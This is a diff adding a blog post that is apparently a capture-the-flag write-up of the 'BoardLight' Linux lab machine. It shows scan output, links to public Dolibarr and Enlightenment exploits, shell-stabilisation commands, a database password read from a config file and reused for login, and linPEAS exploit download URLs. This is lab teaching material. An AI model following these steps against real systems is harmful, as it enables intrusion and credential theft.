@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Easy - BoardLight - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Easy - BoardLight</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1723709961573"
+                  >2024-08-15 10:19</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156053139"
+                  >2025-03-16 21:14</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn<span class="hljs-string">'t have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<p><img src="/_resources/a38b89ec4442440ca2c07bf37ffe9dda.png" /></p>
+<div><pre class="hljs"><code>- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.129.231.37
++ Target Hostname:    10.129.231.37
++ Target Port:        80
++ Start Time:         2024-08-15 08:36:51 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use <span class="hljs-string">'-C all'</span> to force check all possible <span class="hljs-built_in">dirs</span>)
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2024-08-15 08:41:57 (GMT0) (306 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre></div>
+<p>After stumbling for way too long, we can find board.htb domain at the bottom of the page.</p>
+<p><img src="/_resources/6a617d86b940490e813b81fd3ae9ad79.png" /></p>
+<p>Then we can do subdomain enumeration using gobuster, after adding this domain to dnsmasq.conf file.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://board.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://board.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   <span class="hljs-literal">true</span>
+===============================================================
+Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode
+===============================================================
+Found: crm.board.htb Status: 200 [Size: 6360]</code></pre></div>
+<p>After going to the site, we can see Dolibar 17.0.0</p>
+<p><img src="/_resources/8bc6d541bcfa49cd896d5ce87451d7ca.png" /></p>
+<p>And fortunetly there is an exploit for that.<br />
+<a title="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></p>
+<p><img src="/_resources/b83d5ab6c1cb44b1b1cc1234b5721752.png" /></p>
+<p><img src="/_resources/14b8150a4e354513a8d51d830908538b.png" /></p>
+<p>For QoL, we can get shell stablisation.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> TERM=xterm
+CTRL-Z
+stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="user-login">User login</h1>
+<p>LinEnum.sh returns nothing of value as usualy.</p>
+<p>After a lot of stumbling, we get</p>
+<div><pre class="hljs"><code>www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
+&lt;?php
+//
+// File generated by Dolibarr installer 17.0.0 on May 13, 2024
+//
+// Take a look at conf.php.example file <span class="hljs-keyword">for</span> an example of conf.php file
+// and explanations <span class="hljs-keyword">for</span> all possibles parameters.
+//
+<span class="hljs-variable">$dolibarr_main_url_root</span>=<span class="hljs-string">'http://crm.board.htb'</span>;
+<span class="hljs-variable">$dolibarr_main_document_root</span>=<span class="hljs-string">'/var/www/html/crm.board.htb/htdocs'</span>;
+<span class="hljs-variable">$dolibarr_main_url_root_alt</span>=<span class="hljs-string">'/custom'</span>;
+<span class="hljs-variable">$dolibarr_main_document_root_alt</span>=<span class="hljs-string">'/var/www/html/crm.board.htb/htdocs/custom'</span>;
+<span class="hljs-variable">$dolibarr_main_data_root</span>=<span class="hljs-string">'/var/www/html/crm.board.htb/documents'</span>;
+<span class="hljs-variable">$dolibarr_main_db_host</span>=<span class="hljs-string">'localhost'</span>;
+<span class="hljs-variable">$dolibarr_main_db_port</span>=<span class="hljs-string">'3306'</span>;
+<span class="hljs-variable">$dolibarr_main_db_name</span>=<span class="hljs-string">'dolibarr'</span>;
+<span class="hljs-variable">$dolibarr_main_db_prefix</span>=<span class="hljs-string">'llx_'</span>;
+<span class="hljs-variable">$dolibarr_main_db_user</span>=<span class="hljs-string">'dolibarrowner'</span>;
+<span class="hljs-variable">$dolibarr_main_db_pass</span>=<span class="hljs-string">'serverfun2$2023!!'</span>;
+<span class="hljs-variable">$dolibarr_main_db_type</span>=<span class="hljs-string">'mysqli'</span>;
+<span class="hljs-variable">$dolibarr_main_db_character_set</span>=<span class="hljs-string">'utf8'</span>;
+<span class="hljs-variable">$dolibarr_main_db_collation</span>=<span class="hljs-string">'utf8_unicode_ci'</span>;
+// Authentication settings
+<span class="hljs-variable">$dolibarr_main_authentication</span>=<span class="hljs-string">'dolibarr'</span>;</code></pre></div>
+<p>username: larrissa<br />
+password: serverfun2$2023!!</p>
+<p>and we get the flag in /home/larissa/user.txt</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Running linPEAS as larissa gives us 3 CVEs:</p>
+<div><pre class="hljs"><code>[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: probable
+   Tags: [ ubuntu=(20.04|21.04) ],debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded</code></pre></div>
+<div><pre class="hljs"><code>                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
+                      ╚════════════════════════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#sudo-and-suid</span>
+-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
+-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  ---&gt;  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  ---&gt;  HP-UX_10.20
+-rwsr-xr-x 1 root root 55K Apr  9 08:34 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 67K Apr  9 08:34 /usr/bin/su
+-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  ---&gt;  SuSE_9.3/10
+-rwsr-xr-x 1 root root 39K Apr  9 08:34 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper</code></pre></div>
+<p>All of the enlighten modules are suspicous. Quick github search gives us:<br />
+<a title="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit</a></p>
+<p>It works.<br />
+<img src="/_resources/2c4258e7af5d44a4a249737ad07d6059.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
